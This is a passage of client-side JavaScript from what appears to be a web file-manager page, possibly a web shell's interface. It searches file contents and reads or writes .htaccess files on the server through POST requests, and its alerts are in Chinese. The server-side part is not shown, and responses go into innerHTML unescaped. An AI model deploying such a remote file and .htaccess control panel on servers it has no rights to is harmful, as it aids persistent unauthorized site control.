                body: body
            })
            .then(response => response.text())
            .then(html => {
                let searchContentContainer = document.getElementById('searchContentContainer');
                if (!searchContentContainer) {
                    searchContentContainer = document.createElement('div');
                    searchContentContainer.id = 'searchContentContainer';
                    searchContentContainer.className = 'dialog-container';
                    document.body.appendChild(searchContentContainer);
                }
                
                searchContentContainer.innerHTML = html;
                searchContentContainer.style.display = 'block';
                
                document.getElementById('contentInput').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        searchContent();
                    }
                });
            });
        }

        function searchContent() {
            const content = document.getElementById('contentInput').value;
            const urlParams = new URLSearchParams(window.location.search);
            const path = urlParams.get('path');

            let body = `op=searchcontent&content=${encodeURIComponent(content)}`;
            if (path) {
                body += `&path=${encodeURIComponent(path)}`;
            }

            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: body
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.getElementById('searchContentOutput');
                outputDiv.innerHTML = `<pre>${data.output}</pre>`;
                outputDiv.scrollTop = outputDiv.scrollHeight;
            });
        }

        function showHtaccess() {
            hideAllInterfaces();
            const urlParams = new URLSearchParams(window.location.search);
            const path = urlParams.get('path');

            let body = 'op=htaccess';
            if (path) {
                body += `&path=${encodeURIComponent(path)}`;
            }

            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: body
            })
            .then(response => response.text())
            .then(html => {
                let htaccessContainer = document.getElementById('htaccessContainer');
                if (!htaccessContainer) {
                    htaccessContainer = document.createElement('div');
                    htaccessContainer.id = 'htaccessContainer';
                    htaccessContainer.className = 'dialog-container';
                    document.body.appendChild(htaccessContainer);
                }
                
                htaccessContainer.innerHTML = html;
                htaccessContainer.style.display = 'block';
            });
        }

        function generateHtaccess() {
            const content = document.getElementById('htaccessContent').value;
            const urlParams = new URLSearchParams(window.location.search);
            const path = urlParams.get('path');
            
            let body = `op=htaccess&content=${encodeURIComponent(content)}`;
            if (path) {
                body += `&path=${encodeURIComponent(path)}`;
            }

            fetch(currentScript, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: body
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('.htaccess文件已成功創建！');
                    location.reload();
                } else {
                    alert('錯誤：' + (data.error || '創建.htaccess文件失敗'));
                }
            });
        }
    </script>

</body>
</html>
